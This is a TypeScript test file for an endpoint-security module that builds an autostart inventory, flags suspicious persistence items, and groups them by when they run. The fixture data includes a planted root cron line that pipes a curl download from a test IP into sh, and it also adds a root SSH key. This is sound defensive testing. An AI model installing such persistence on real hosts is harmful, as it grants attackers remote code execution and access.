import { describe, expect, it } from 'vitest'
import type { ApiEvent } from './api'
import { buildAutostart, itemState, matchesAutostart, momentOf } from './persistence'

let serial = 0
function event(type: string, timestamp: number, data: Record<string, unknown>): ApiEvent {
  return { id: `e${++serial}`, agent_id: 'a1', event_type: type, timestamp, received_at: timestamp, data: JSON.stringify(data) }
}

function item(timestamp: number, action: string, kind: string, name: string, path: string, command: string, user = 'root'): ApiEvent {
  return event('persistence', timestamp, { timestamp, action, kind, name, path, command, user, enabled: true, hash: null })
}

const PLANTED = '* * * * * root curl -fsS http://203.0.113.47/u | sh'

describe('buildAutostart', () => {
  it('folds the inventory into what the endpoint has now, whatever order the events arrive in', () => {
    const items = buildAutostart(
      [
        item(300, 'Changed', 'cron', 'certbot', '/etc/cron.d/certbot', 'certbot -q renew --deploy-hook reload'),
        item(100, 'Present', 'cron', 'certbot', '/etc/cron.d/certbot', 'certbot -q renew'),
        item(100, 'Present', 'systemd_unit', 'ssh.service', '/usr/lib/systemd/system/ssh.service', '/usr/sbin/sshd -D'),
        item(400, 'Present', 'cron', 'certbot', '/etc/cron.d/certbot', 'certbot -q renew --deploy-hook reload'),
      ],
      [],
    )
    expect(items.map((entry) => entry.name)).toEqual(['certbot', 'ssh.service'])
    expect(items[0]).toMatchObject({ change: 'Changed', changedAt: 300, seenAt: 400, command: 'certbot -q renew --deploy-hook reload' })
    expect(items[1]).toMatchObject({ change: null, changedAt: null })
  })

  it('puts a flagged item first and keeps a removed one in view', () => {
    const items = buildAutostart(
      [
        item(100, 'Present', 'systemd_unit', 'ssh.service', '/usr/lib/systemd/system/ssh.service', '/usr/sbin/sshd -D'),
        item(200, 'Added', 'cron', 'sysupdate', '/etc/cron.d/sysupdate', PLANTED),
        item(250, 'Added', 'authorized_key', 'root@build', '/root/.ssh/authorized_keys', 'ssh-ed25519'),
        item(300, 'Removed', 'authorized_key', 'root@build', '/root/.ssh/authorized_keys', 'ssh-ed25519'),
      ],
      [
        event('detection', 200, { title: 'Autostart item downloads and runs code', technique: 'T1053.003', level: 'high', autostart: 'cron', image: '/etc/cron.d/sysupdate', subject: 'sysupdate' }),
        event('detection', 250, { title: 'SSH key added for root', technique: 'T1098.004', level: 'medium', autostart: 'authorized_key', image: '/root/.ssh/authorized_keys', subject: 'root@build' }),
        event('detection', 260, { title: 'Encoded PowerShell command', technique: 'T1059.001', level: 'high', image: 'powershell.exe', subject: null }),
      ],
    )
    expect(items.map((entry) => entry.name)).toEqual(['sysupdate', 'root@build', 'ssh.service'])
    expect(items[0]!.finding).toEqual({ title: 'Autostart item downloads and runs code', technique: 'T1053.003', high: true })
    expect(items[1]).toMatchObject({ change: 'Removed', finding: null })
  })

  it('finds an item by any of its fields', () => {
    const [planted] = buildAutostart([item(200, 'Added', 'cron', 'sysupdate', '/etc/cron.d/sysupdate', PLANTED)], [])
    expect(matchesAutostart(planted!, 'CURL')).toBe(true)
    expect(matchesAutostart(planted!, 'cron.d')).toBe(true)
    expect(matchesAutostart(planted!, '')).toBe(true)
    expect(matchesAutostart(planted!, 'wget')).toBe(false)
  })
})

describe('when an item runs', () => {
  it('groups kinds by the moment that triggers them', () => {
    expect(['systemd_unit', 'rc_local', 'cron', 'systemd_timer', 'shell_profile', 'authorized_key', 'ld_preload'].map(momentOf)).toEqual([
      'boot',
      'boot',
      'schedule',
      'schedule',
      'signin',
      'remote',
      'program',
    ])
    expect(momentOf('something_new')).toBeNull()
  })

  it('says how an item stands: flagged before changed, removed on its own', () => {
    const items = buildAutostart(
      [
        item(100, 'Present', 'cron', 'certbot', '/etc/cron.d/certbot', 'certbot -q renew'),
        item(200, 'Added', 'cron', 'sysupdate', '/etc/cron.d/sysupdate', PLANTED),
        item(210, 'Added', 'authorized_key', 'root@build', '/root/.ssh/authorized_keys', 'ssh-ed25519'),
        item(220, 'Removed', 'cron', 'old', '/etc/cron.d/old', 'true'),
      ],
      [event('detection', 201, { autostart: 'cron', image: '/etc/cron.d/sysupdate', subject: 'sysupdate', title: 'Autostart item downloads and runs code', technique: 'T1053.003', level: 'high' })],
    )
    expect(Object.fromEntries(items.map((entry) => [entry.name, itemState(entry)]))).toEqual({
      sysupdate: 'flagged',
      'root@build': 'changed',
      old: 'removed',
      certbot: 'plain',
    })
  })
})
